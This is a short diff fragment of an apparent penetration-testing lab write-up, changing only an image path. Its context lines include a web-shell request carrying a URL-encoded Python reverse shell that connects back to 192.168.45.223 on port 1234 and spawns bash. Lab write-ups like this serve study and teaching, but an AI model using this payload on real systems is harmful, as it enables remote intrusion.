@@ -51,7 +51,7 @@ PORT      STATE SERVICE VERSION
 
 
 
-<figure><img src="../.gitbook/assets/Pasted image 20231022222314.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Pasted image 20231022222314.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 http://192.168.240.193/shell.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.45.223%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
